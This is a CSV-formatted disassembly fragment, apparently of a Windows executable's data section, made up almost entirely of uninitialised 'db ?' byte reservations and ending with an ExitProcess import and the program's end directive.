Opcode,Operand,Comment
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
DATA,ends,
extrn,__imp_ExitProcess:dword,;	DATA XREF: ExitProcessr
end,start,
